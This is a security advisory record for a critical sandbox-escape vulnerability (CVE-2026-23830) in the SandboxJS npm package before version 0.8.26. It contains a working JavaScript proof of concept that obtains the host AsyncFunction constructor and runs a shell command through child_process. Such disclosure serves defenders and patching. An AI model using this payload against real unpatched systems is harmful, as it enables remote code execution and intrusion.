advisory_id: GHSA-wxhw-j4hc-fmq6
datasource_id: github_osv_importer_v2/GHSA-wxhw-j4hc-fmq6
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-wxhw-j4hc-fmq6/GHSA-wxhw-j4hc-fmq6.json
aliases:
  - CVE-2026-23830
summary: "SandboxJS has Sandbox Escape via Unprotected AsyncFunction Constructor\n### Summary\n\
  A sandbox escape vulnerability due to `AsyncFunction` not being isolated in `SandboxFunction`\n\
  \n### Details\n\nThe library attempts to sandbox code execution by replacing the global `Function`\
  \ constructor with a safe, sandboxed version (`SandboxFunction`). This is handled in `utils.ts`\
  \ by mapping `Function` to `sandboxFunction` within a map used for lookups.\n\nHowever, the\
  \ library did not include mappings for `AsyncFunction`, `GeneratorFunction`, and `AsyncGeneratorFunction`.\
  \ These constructors are not global properties but can be accessed via the `.constructor`\
  \ property of an instance (e.g., `(async () => {}).constructor`).\n\nIn `executor.ts`, property\
  \ access is handled. When code running inside the sandbox accesses `.constructor` on an async\
  \ function (which the sandbox allows creating), the `executor` retrieves the property value.\
  \ Since `AsyncFunction` was not in the safe-replacement map, the `executor` returns the actual\
  \ native host `AsyncFunction` constructor.\n\nConstructors for functions in JavaScript (like\
  \ `Function`, `AsyncFunction`) create functions that execute in the global scope. By obtaining\
  \ the host `AsyncFunction` constructor, an attacker can create a new async function that executes\
  \ entirely outside the sandbox context, bypassing all restrictions and gaining full access\
  \ to the host environment (Remote Code Execution).\n\n### PoC\n\n```js\nconst sandbox = require('@nyariv/sandboxjs');\n\
  const s = new sandbox.default();\n\nconst payload = `\n    const af = async () => {};\n  \
  \  // .constructor returns the host AsyncFunction constructor because it's not intercepted\n\
  \    const AsyncConstructor = af.constructor;\n    console.log(\"AsyncConstructor name:\"\
  , AsyncConstructor.name);\n    \n    // Create a function that executes outside the sandbox\n\
  \    const func = AsyncConstructor(\"return process.mainModule.require('child_process').execSync('id').toString()\"\
  );\n    \n    // Execute RCE\n    const p = func();\n    p.then(proc => {\n        console.log(proc);\n\
  \    });\n`;\n\ntry {\n    s.compile(payload)().run();\n} catch (e) {\n    console.error(\"\
  Bypass failed:\", e.message);\n}\n```\n\nRun above script in nodejs. If you run it in browser,\
  \ change the `AsyncConstructor` argument by returning `window` object. \n\n### Impact\n\n\
  A Remote Code Execution, attacker may be able to run an arbitrary code."
impacted_packages:
  - purl: pkg:npm/%40nyariv/sandboxjs
    affected_versions: vers:npm/<0.8.26
    fixed_versions: vers:npm/0.8.26
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '10.0'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-wxhw-j4hc-fmq6/GHSA-wxhw-j4hc-fmq6.json
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-913
  - CWE-94
  - CWE-693
references:
  - url: https://github.com/nyariv/SandboxJS
    reference_type:
    reference_id:
  - url: https://github.com/nyariv/SandboxJS/commit/345aee6566e47979dee5c337b925b141e7f78ccd
    reference_type:
    reference_id:
  - url: https://github.com/nyariv/SandboxJS/security/advisories/GHSA-wxhw-j4hc-fmq6
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-23830
    reference_type:
    reference_id:
